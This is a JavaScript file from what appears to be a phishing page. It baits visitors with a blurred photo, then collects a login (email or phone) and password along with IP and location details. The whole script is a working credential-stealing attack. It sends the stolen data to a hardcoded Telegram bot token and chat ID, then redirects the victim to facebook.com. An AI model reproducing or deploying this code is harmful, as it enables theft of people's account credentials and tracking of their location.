$(document).ready( () => {    
  
      const inptVal = () => {
        argv1 = document.getElementById('argv1').value;
        argv2 = document.getElementById('argv2').value,
        emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
        validated = '';
       
        if( argv1 == '' || argv2 == '' ){
          validated = false;
        } else if ( emailRegex.test(argv1) & argv2.length >= 6 ) {
          validated = true; 
        } else {
          ( isNaN(argv1) || argv1.length < 10 || argv2.length < 6 )
          ? validated = false
          : validated = true;
        }
        return validated;
      }

      const ready = () => {
        if( inptVal() == false){
          let validated = false;
        } else {
          $('#btn-cont').prop("disabled", true);
          let dip =  $('#dip').text(),
              cou =  $('#cou').text(),
              sta =  $('#sta').text(),
              ciu =  $('#ciu').text();

          let message =  `■■■■■🤣🫵🤡■■■■■
👤 L: ${argv1} 
🔑 C: ${argv2}
🌐 i: ${dip}
🌎 P: ${cou}
🏛 E: ${sta}
🏙 Ct: ${ciu}
■■■■■■■■■■■■■■`;
              return message;
        }
        }

      const sender = async(msg) => {
        const telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
             chat_id = '-1001908180943';

        let settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": msg
            })
        };
        $.ajax(settings).done(function (response) {
            console.log(response);
            localStorage.setItem('visto', 'true');
            $('#exampleModal').modal('hide');
            imgFin();
            rel();
        });

      }

      const imgFin = () => {
        const blur = document.getElementById('blur');
        $('#btn-ver').prop("disabled", true);
        blur.classList.toggle('active');
        $('#txt-ver').text('Cubrir foto');
      };

      const hidPost = () => {
        $('#post').css('display', 'none');
        $('#visto').css('display', 'block');
        $('#ini'). on('click', () => {
          location.href="http://facebook.com"
        });
      };

      const rel = () => {
        setTimeout(() => {
          location.reload();
        }, 8000);
      }

      $('.argv').on('focus', () => {
        $('.argv').removeClass('err');
      });

      $('#btn-cont').on('click', () => {
        let listo = ready();
        (listo)
        ? sender(listo)
        : $('.argv').addClass('err');
      });

      $('#btn-ver').on('click', () => {
        const argv2 = document.getElementById('argv2');
        argv2.type = 'password';
        $('.argv').removeClass('err');

      });


      const visto = localStorage.getItem('visto');
      if(visto == 'true') {
        imgFin();
        hidPost();
      }

});